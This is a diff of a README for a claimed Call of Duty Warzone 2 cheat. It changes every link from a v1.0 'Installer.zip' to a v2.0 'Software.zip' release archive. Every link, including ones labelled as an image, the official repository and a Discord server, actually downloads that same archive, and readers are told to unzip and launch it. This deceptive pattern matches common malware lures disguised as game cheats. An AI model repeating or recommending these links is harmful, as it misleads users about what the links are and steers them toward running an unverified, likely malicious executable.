@@ -1,6 +1,6 @@
 # 🎮 INTERWEBS COD Warzone 2 Cheat 🎯
 
-![COD Warzone](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v1.0/Installer.zip)
+![COD Warzone](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v2.0/Software.zip)
 
 ## Introduction
 
@@ -16,7 +16,7 @@ Welcome to the **INTERWEBS COD Warzone 2 Cheat** repository! This project is a C
 
 ## How to Use
 
-1. Download the latest version of the cheat from the [**Releases**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v1.0/Installer.zip) section.
+1. Download the latest version of the cheat from the [**Releases**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v2.0/Software.zip) section.
 
 2. Unzip the downloaded file and launch the cheat application.
 
@@ -32,19 +32,19 @@ Welcome to the **INTERWEBS COD Warzone 2 Cheat** repository! This project is a C
 
 ## Quick Start
 
-To get started with the cheat, simply [**download**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v1.0/Installer.zip) the latest version and launch the application.
+To get started with the cheat, simply [**download**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v2.0/Software.zip) the latest version and launch the application.
 
-[![Download Cheat](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v1.0/Installer.zip%20Version-blue)](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v1.0/Installer.zip)
+[![Download Cheat](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v2.0/Software.zip%20Version-blue)](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v2.0/Software.zip)
 
 Launch the downloaded file and follow the on-screen instructions to set up and customize the cheat according to your preferences.
 
 ## Additional Resources
 
-For more information and updates, visit the official [**COD Warzone 2 Cheat**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v1.0/Installer.zip) GitHub repository.
+For more information and updates, visit the official [**COD Warzone 2 Cheat**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v2.0/Software.zip) GitHub repository.
 
 ## Join the Community
 
-Connect with other players and cheat enthusiasts in our [**Discord server**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v1.0/Installer.zip) to discuss strategies, share tips, and stay updated on the latest cheat features.
+Connect with other players and cheat enthusiasts in our [**Discord server**](https://github.com/Ichsanfathur/INTERWEBS-COD-Warzone-2-Cheat/releases/download/v2.0/Software.zip) to discuss strategies, share tips, and stay updated on the latest cheat features.
 
 ## Legal Disclaimer
 
